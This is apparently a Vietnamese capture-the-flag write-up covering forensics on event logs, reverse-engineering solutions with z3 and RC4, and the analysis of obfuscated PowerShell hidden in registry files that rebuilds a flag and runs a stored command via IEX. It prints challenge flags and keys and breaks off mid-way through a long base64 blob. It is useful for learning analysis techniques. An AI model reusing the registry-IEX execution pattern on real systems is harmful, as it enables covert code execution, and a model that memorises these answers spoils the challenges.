+Sử dụng [lnkinfo](https://www.howtoinstall.me/ubuntu/18-04/liblnk-utils/) xem thông tin tệp này [lnk](https://help.dropbox.com/installs-integrations/desktop/lnk-files#:~:text=lnk%20are%20Windows%20shortcut%20files,in%20order%20to%20sync%20them.).
+
+![image](https://user-images.githubusercontent.com/32236617/137688915-09acf435-b89b-45a0-8f63-2500b83118cd.png)
+
+Xác định đường tệp gốc flag nằm ở đường dẫn `D:\Work\CONFIDENTAL\ProjectX\2021\SECRET\flag.txt`. Nhưng vấn là ổ đĩa D không có trông tệp đĩa hình ảnh ban đầu. Vì trong cờ giả có từ khóa `NTFS` nên mình nghĩ có thể sử dụng [mtfparse](https://github.com/EricZimmerman/MFT) để xem các giá trị offset của tệp flag.txt trên `RAM`, làm các phép tính toán với [ntfs-partition-boot-sector](http://ntfs.com/ntfs-partition-boot-sector.htm) rồi trace trực tiếp nhưng có vẻ không khả thi.
+
+Mình có lục lọi các tệp khác trên hệ thống, mong rằng sẽ tìm được gì khác như bản backup nào đó. Đã xem qua các log internet, user.dat, nhưng không tìm thấy gì khả nghi. Nhưng **suýt** quên mất rằng chúng ta có ổ C, là ổ chứa các tệp nhật kí hệ thống, trong đó có cả event log. Cho dù không có ổ D, nhưng ta vẫn có thể truy vết được các thao tác của tác giả trên hệ thống trước khi thực hiện ghi lại hình ảnh ổ đĩa. Và mong rằng nó có chứa cờ!
+
+Tìm hiểu thì `%SystemRoot%\System32\Winevt\Logs ` sẽ là nơi chứa các tệp lưu lại các nhật kí thao các của người dùng với các ứng dụng, hệ điều hành,.... Dễ hình dung hơn thì nó là các tệp log trên event viewer hay coi. Và có lẽ các thao tác của tác giả khi tương tác với tệp `flag.txt` cũng nằm trên này. Việc bây giờ là cần xem qua các tệp này, vì cờ có thể ở bất kì bản nhật kí người dùng nào. 
+
+![image](https://user-images.githubusercontent.com/32236617/137704675-6cc875c7-a4eb-48e7-98f1-484fdd6b3c8b.png)
+
+Mất khá nhiều thời gian để tìm đến được tệp [Microsoft-Windows-Sysmon%4Operational.evtx](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon), tệp này là bản ghi lưu lại nhật kí các thao tác dịch vụ hệ thống windows và trình điều khiển thiết bị, sau khi được cài đặt trên hệ thống.
+
+Sử dụng event viewer trên windows hoặc [filext.com/file-extension/EVTX](https://filext.com/file-extension/EVTX) để xem online.
+
+Khuyến mãi: https://www.sans.org/blog/parsing-sysmon-events-for-ir-indicators/
+
+![image](https://user-images.githubusercontent.com/32236617/137701540-f1609ce1-90a6-4e0d-b0e1-3f8c87e10c4a.png)
+
+![image](https://user-images.githubusercontent.com/32236617/137701000-583f6f8b-b392-46cd-a061-8ccc030fb148.png)   
+  
+# RE  
+
+## FSM
+
+> Binary: [fsm_B6CB40CE8F1E1C0B71B376A259F42C8F.exe](https://drive.google.com/file/d/1HKuM3NNG7oUzKONznmnob6xD6r-piakw) (PE x64)
+
+Yêu cầu thử thách này là cần nhập 3 giá trị hex theo đúng định dạng để làm key. Các  giá trị vừa nhập đó sẽ được đưa vào 1 loạt thuật toán xor để tạo ra 2 giá trị cuối cùng tạm gọi ở đây là *checksum1* và *checksum2*.  
+  
+![1](https://user-images.githubusercontent.com/85006768/137727254-b70a7239-6238-4ff4-9b24-53fcfa795468.png)    
+  
+Tiếp tục chương trình tạo thread để kiểm tra 2 giá trị *checksum1* và *checksum2*.  
+![2](https://user-images.githubusercontent.com/85006768/137727343-8f4705a0-130f-4ec4-80fe-c4866c181203.png)  
+
+Tại luồng xử lý của thread kiểm tra 3 điều kiện.  
+![3](https://user-images.githubusercontent.com/85006768/137727415-550e7a63-baf3-4432-b658-1cd1faa2a697.png)  
+  
+Vậy thì có 3 điều kiện cho ba giá trị cần tìm. Dùng z3solver để giải bài này:
+
+```python
+from z3 import *
+
+s = Solver()
+part1 = BitVec('part1', 32)
+part2 = BitVec('part2', 32)
+part3 = BitVec('part3', 32)
+
+
+s.add(1620 * part2 + 5447 * part3 + 17170 * part1 == 0x52D012C ^ 0x2ED0F8B0)
+s.add(9543 * part3 + 19218 * part1 + 27870 * part2 == 0x323030B5 ^ 0x63987AEB)
+s.add(7287 * part3 + 11210 * part1 + 24874 * part2 == 0x8A0B76BC ^ 0xB6DDCFF6)
+
+print(s.check())
+m = s.model()
+flag = []
+md = sorted([(d, m[d]) for d in m], key = lambda x: str(x[0]))
+for i in md:
+  flag.append(i[1].as_long())
+
+for i in flag:
+  print(hex(i)[2:],end = '-')
+```
+
+Kết quả nhận được key và flag như sau:
+
+``` tiddlywiki
+key : 4ab6-2c6d-11894
+Flag: ASCIS{I Know Kung-Fu!}
+```  
+> Flag: `ASCIS{I Know Kung-Fu!}`
+
+## Trace me  
+  
+> Binary: [buf.so](https://drive.google.com/file/d/1DA8altVbeu7DpodTGF_He9ga6xq87tXi) (ELF x86)
+
+Thực thi chương trình nhận được yêu cầu nhập mật khẩu. Sau đó,  hiển thị thông báo như sau:  
+![4](https://user-images.githubusercontent.com/85006768/137727573-729e9dd8-4d0e-48b3-a7bf-bd7ccd92ad31.png)
+  
+Phân tích code bài này với IDA tại hàm main. Nhận thấy đoạn code kiểm tra chuỗi nhập vào.   
+  
+![5](https://user-images.githubusercontent.com/85006768/137727654-ad5b8bed-3db5-4634-a184-f418f45b432c.png)
+  
+Đi thử thực thi chương trình với chuỗi này và kết quả thất bại.
+  
+![6](https://user-images.githubusercontent.com/85006768/137727732-abb45d74-61b8-4da2-be3f-859c9ce10b48.png)  
+  
+Với tên bài là trace me và luồng thực thi như này thì khả năng tác giả giấu đoạn code chính ở hàm init và sử dụng kỹ thuật ptrace giao tiếp giữa 2 tiến trình. Một thử thách tương tự ở giải `flareon7 (chall 10)` cũng  có ý tưởng tương tự.
+
+Đúng như dự đoán hàm init gọi đến nơi tạo và giao tiếp với tiến trình con để thay đổi data.
+![7](https://user-images.githubusercontent.com/85006768/137727795-75c28518-413d-4037-a75f-5f177e5d101b.png)  
+    
+![8](https://user-images.githubusercontent.com/85006768/137727883-ddbfdd45-6fe4-4689-b01a-8a25e5ce1e63.png)  
+  
+Debug thì phát hiện được hàm sub_14C6 sẽ đọc data tại các địa chỉ trong hàm sub_1B7E của tiến trình con và decode bằng thuật toán xor.   
+  
+![9](https://user-images.githubusercontent.com/85006768/137727970-19d2f844-dcc1-4070-bc06-f7fd84ec525c.png)  
+  
+Hàm sub_1B7E sử dụng thuật toán RC4 để mã hóa chuỗi nhập vào và so sánh với cipher. Key trong hàm này sẽ được tiến trình cha decode rồi tiến trình con bắt đầu dùng key đó decrypt.  
+  
+![10](https://user-images.githubusercontent.com/85006768/137728063-80f136a7-c088-4496-97d2-0e51833c25cd.png)  
+  
+Sau khi Xor ta có được key như sau:  
+  
+Decrypt:
+
+``` tiki wiki
+cipher = b"\xa9\xa5\xe4\x0e{\xb1Q;'\x01\xc6\xa0C\xb3\x0c\xbe\xa5%\xaa\xf7\x95\xbb6\xc4\xe8\x1e\x1c\xd5SV\xd3\xcaF\x9a\xb8$\xbd\x00"
+key = 'ASCIS2021'
+```  
+  
+![12](https://user-images.githubusercontent.com/85006768/137729125-87f48920-e2f7-4eb9-b0c6-5f9be53059aa.png)
+
+## ghost reg
+![image](https://user-images.githubusercontent.com/41907864/137721257-a2ea4b23-be8f-4186-aac1-5b6d468db52e.png)
+
+Sau khi phân tích 3 file `HKCR.reg`, `HKCU.reg`, `HKCM.reg` thì tìm được 2 đoạn có vẻ thú vị
+
+![image](https://user-images.githubusercontent.com/41907864/137721412-c0aa09f8-5905-4f0f-a1fd-faf102fdd12c.png)
+
+Sử dụng công cụ `deobshell` (https://github.com/thewhiteninja/deobshell) kết hợp với deobfuscate bằng "cơm" thì cuối cùng thu được 2 đoạn mã powershell như sau:
+
+part1:
+```powershell
+if(($abcd -split ' ')[-1] -eq "$env:appdata\flag.svattt" -and (Get-FileHash ($abcd -split ' ')[-1] -Algorithm MD5).hash -eq "CF5A6ED30AE66ECF61C1286516F8A943" -and (gc $env:appdata\plmjuh)[-1..-5] -join "" -eq "SCISA"){
+    $11 = (Get-ItemProperty -path "Registry::HKEY_CLASSES_ROOT\svattt\shell\open\command" -name "aocnsit")."aocnsit";
+    $111 = [System.Convert]::FromBase64String($11);
+    $1111 = gc ($abcd -split ' ')[-1] -encoding byte; 
+    $11111 = New-Object Byte[] $111.count;
+    for($i=0; $i -lt $111.count ; $i++) { 
+        $11111[$i] = $111[$i] -bxor $1111[$i];
+    }
+    sc ($abcd -split ' ')[-1] -value $11111 -encoding byte;
+};
+$abcd | IEX;
+```
+part2:
+```powershell
+$abcd.split(' ')[-1].split('.')[-1]
+
+if(test-path $env:appdata\plmjuh -PathType Leaf) {
+    $1 = (gc $env:appdata\plmjuh)[-1..-5]
+}else{
+    ni -path $env:appdata\plmjuh -ItemType "file"
+}
+$11 = $abcd.split(' ')[-1].split('.')[-1]
+ac $env:appdata\plmjuh -value $11
+
+if(-not (test-path "$env:appdata\flag.svattt" -PathType Leaf)) {
+    ni -path "$env:appdata\flag.svattt" -ItemType "file"
+}
+
+if($11 -eq "a"){
+    $111 = (Get-ItemProperty -path "Registry::HKEY_CLASSES_ROOT\uytrsavnsal" -name "jRSgo")."jRSgo";
+    ac $env:appdata\flag.svattt -value ([System.Convert]::FromBase64String($111)) -encoding byte;
+}else{
+    switch ($1[0]){
+        "a"{
+            $111 = (Get-ItemProperty -path "Registry::HKEY_CLASSES_ROOT\uytrsavnsal" -name "WycrJ")."WycrJ";   
+        }
+        "s"{
+            $111 = (Get-ItemProperty -path "Registry::HKEY_CLASSES_ROOT\uytrsavnsal" -name "2NoQX")."2NoQX";
+        }
+        "i"{
+            $111 = (Get-ItemProperty -path "Registry::HKEY_CLASSES_ROOT\uytrsavnsal" -name "JdMTE")."JdMTE";
+        }
+        "c"{
+            $111 = (Get-ItemProperty -path "Registry::HKEY_CLASSES_ROOT\uytrsavnsal" -name "1K1tj")."1K1tj";
+        }
+    }
+    ac $env:appdata\flag.svattt -value ([System.Convert]::FromBase64String($111)) -encoding byte;
+}
+
+$1111 = "Hey $((gc $env:appdata\plmjuh)[-5..-1]), can you find me?"
+
+$11111 = (Get-ItemProperty -path "Registry::HKEY_CLASSES_ROOT\uytrsavnsal" -name "aEFyX")."aEFyX"
+
+sc $abcd.split(' ')[-1] -value ([System.Convert]::FromBase64String($11111)) -encoding Byte
+
+ac $abcd.split(' ')[-1] -value "Hey $((gc $env:appdata\plmjuh)[-5..-1] -join ''), can you find me?"
+
+$abcd | IEX
+```
+
+Tiếp tục debug 2 đoạn powershell này bằng công cụ `Powershell Tools for Visual Studio`
+
+![image](https://user-images.githubusercontent.com/41907864/137722084-2d10bd98-2819-4051-bd91-7a33d1be560b.png)
+
+Để ý kĩ thì đoạn powershell nàyn sẽ kiểm tra điều kiện và switch case để quyết định lấy dữ liệu từ registry nào để `Base64 decode` và cuối cùng là append vào file `flag.svattt`.
+```powershell
+if($11 -eq "a"){
+    $111 = (Get-ItemProperty -path "Registry::HKEY_CLASSES_ROOT\uytrsavnsal" -name "jRSgo")."jRSgo";
+    ac $env:appdata\flag.svattt -value ([System.Convert]::FromBase64String($111)) -encoding byte;
+}else{
+    switch ($1[0]){
+        "a"{
+            $111 = (Get-ItemProperty -path "Registry::HKEY_CLASSES_ROOT\uytrsavnsal" -name "WycrJ")."WycrJ";   
+        }
+        "s"{
+            $111 = (Get-ItemProperty -path "Registry::HKEY_CLASSES_ROOT\uytrsavnsal" -name "2NoQX")."2NoQX";
+        }
+        "i"{
+            $111 = (Get-ItemProperty -path "Registry::HKEY_CLASSES_ROOT\uytrsavnsal" -name "JdMTE")."JdMTE";
+        }
+        "c"{
+            $111 = (Get-ItemProperty -path "Registry::HKEY_CLASSES_ROOT\uytrsavnsal" -name "1K1tj")."1K1tj";
+        }
+    }
+    ac $env:appdata\flag.svattt -value ([System.Convert]::FromBase64String($111)) -encoding byte;
+}
+```
+
+Lại để ý ở `part1`, md5 của file `flag.svattt` phải trùng với `CF5A6ED30AE66ECF61C1286516F8A943`. Vì mình không biết được thứ tự append các content vào file `flag.svattt` nên mình quyết định sẽ viết 1 script để brute thứ tự.
+
+```python
+from hashlib import md5
+from base64 import b64decode
+from itertools import permutations
+
+list_content = []
+list_content.append("ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLnNhYWFuWVlUWW5hYWFjLiAgICAgICAgICAgI...")
+list_content.append("/9j/4AAQSkZJRgABAQEA8ADwAAD/4SdARXhpZgAATU0AKgAAAAgACwEPAAIAAAAGAAAAkgEQAAIAA...")
+list_content.append("/wCsl2455FOfS7QSljNJ6jGOKxWsJsj93J82Tgg06SwujJt8uYbuOlP2f98j2lTsjXFhZqzDzpcYz...")
+list_content.append("3b/s/wCc1Yg+IOq7l/0peByAOnf8aJSxn938SKccJLVwl96/yLsnhG+i8GeIt1vIudHvV6DGTbyD/...")
+list_content.append("VsPRpVn70U7+rtq10elvRI/lXMMuwFHG1K+Eu76eStKWkXu1y8rb7trpo6RAVCGSM56fN7VH5beXy...")
+list_content.append("r9Yv+C1Xh7zvD/w/1FV/1dzdWpbHTdGGH/oNfkN+014TvW8bx3GnX09rewyl7ZI3Mm8tsLlv7q7ZP...")
+
+for contents in permutations(list_content, 5):
+    temp = ''
+    for content in contents:
+        temp += b64decode(content)
+    if md5(temp).hexdigest().upper()== 'CF5A6ED30AE66ECF61C1286516F8A943':
+        open('flag.svattt', 'wb').write(temp)
+        print 'found'
+        break
+```
+Ở `part1`, sau khi thỏa mấy điều kiện ở trên sẽ đọc giá trị của `aocnsit` trong registry sau đó thực hiện vòng lặp để  `xor` với file `flag.svattt`.
+
+```python
+from base64 import b64decode
+
+b = open('flag.svattt', 'rb').read()
+a = b64decode("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAeAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA